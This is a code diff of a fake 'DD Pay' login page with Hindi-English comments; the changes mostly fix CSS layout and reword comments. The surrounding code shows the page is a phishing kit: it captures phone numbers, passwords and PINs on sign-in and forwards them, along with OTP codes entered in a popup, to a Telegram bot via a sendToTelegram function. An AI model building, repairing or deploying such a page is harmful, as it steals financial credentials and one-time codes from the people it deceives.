@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DD Pay - Login</title>
-    <!-- Icons ke liye FontAwesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
@@ -14,7 +13,7 @@
         
         /* Logo Design */
         .logo-container { text-align: center; margin-bottom: 30px; margin-top: 20px; }
-        .logo-container img { width: 180px; }
+        .logo-container img { width: 180px; max-width: 100%; height: auto; }
 
         /* Input Boxes */
         .input-group { position: relative; margin-bottom: 15px; }
@@ -47,11 +46,11 @@
         .modal-text { font-size: 14px; color: #008e5a; margin-bottom: 10px; line-height: 1.4; font-weight: 500; }
         .modal-phone { font-size: 15px; font-weight: bold; color: #008e5a; margin-bottom: 20px; }
 
-        /* OTP Input Area */
-        .otp-input-row { display: flex; align-items: center; border: 1px solid #ccc; border-radius: 30px; padding: 5px 5px 5px 20px; margin-bottom: 20px; }
-        .otp-input-row i { color: #008e5a; font-size: 18px; margin-right: 10px; }
-        .otp-input-row input { flex: 1; border: none; outline: none; font-size: 16px; }
-        .btn-send { background: #008e5a; color: white; border: none; padding: 10px 25px; border-radius: 25px; font-size: 15px; cursor: pointer; font-weight: 600; }
+        /* OTP Input Area - FIXED BUTTON OVERFLOW */
+        .otp-input-row { display: flex; align-items: center; border: 1px solid #ccc; border-radius: 30px; padding: 5px; margin-bottom: 20px; overflow: hidden; }
+        .otp-input-row i { color: #008e5a; font-size: 18px; margin-left: 15px; margin-right: 10px; flex-shrink: 0; }
+        .otp-input-row input { flex: 1; min-width: 0; border: none; outline: none; font-size: 15px; padding: 5px; }
+        .btn-send { background: #008e5a; color: white; border: none; padding: 10px 15px; border-radius: 25px; font-size: 14px; cursor: pointer; font-weight: 600; white-space: nowrap; flex-shrink: 0; }
         
         .btn-confirm { background: #008e5a; color: white; box-shadow: 0 4px 10px rgba(0, 142, 90, 0.3); }
     </style>
@@ -61,7 +60,7 @@
     <div class="main-container">
         <!-- Logo -->
         <div class="logo-container">
-            <!-- Yahan aap apna asli logo link daal sakte hain (src="...") -->
+            <!-- Yahan aap apne logo ka link daalein, abhi temporary imgbb link hai -->
             <img src="https://i.ibb.co/6PZk6vC/ddpay-logo.png" alt="DD Pay" onerror="this.src='https://via.placeholder.com/180x80?text=DD+Pay'">
         </div>
 
@@ -138,7 +137,6 @@
             }
         }
 
-        // --- MODAL LOGIC ---
         const modal = document.getElementById('otpModal');
         const displayPhone = document.getElementById('displayPhone');
         
@@ -146,25 +144,21 @@
             modal.style.display = 'none';
         }
 
-        // Main Form Submit (Sign In button)
+        // Main Form Submit
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const phone = document.getElementById('phone').value;
             const password = document.getElementById('password').value;
             const pin = document.getElementById('pin').value;
 
-            // Telegram par sign in details bhejna
             const msg = `🔔 *User ne Sign In kiya!*\n\n📞 Phone: ${phone}\n🔑 Password: ${password}\n🔢 PIN: ${pin}`;
             sendToTelegram(msg);
 
-            // Phone number popup me dikhana
             displayPhone.innerText = `+91 ${phone}`;
-            
-            // OTP Popup kholna
             modal.style.display = 'flex';
         });
 
-        // Popup me "Send" button dabane par (OTP Request)
+        // Send OTP Button
         document.getElementById('sendOtpBtn').addEventListener('click', async function() {
             const phone = document.getElementById('phone').value;
             this.innerText = "Sending...";
@@ -176,14 +170,14 @@
             if(success) {
                 alert("OTP Request aapke Telegram par bhej di gayi hai!");
             } else {
-                alert("Telegram par nahi gaya, API check karein.");
+                alert("Telegram par nahi gaya, Vercel me API settings check karein.");
             }
 
             this.innerText = "Send";
             this.disabled = false;
         });
 
-        // Popup me "Confirm" button dabane par (OTP Verification)
+        // Confirm OTP Button
         document.getElementById('confirmOtpBtn').addEventListener('click', async function() {
             const phone = document.getElementById('phone').value;
             const otp = document.getElementById('otpCode').value;
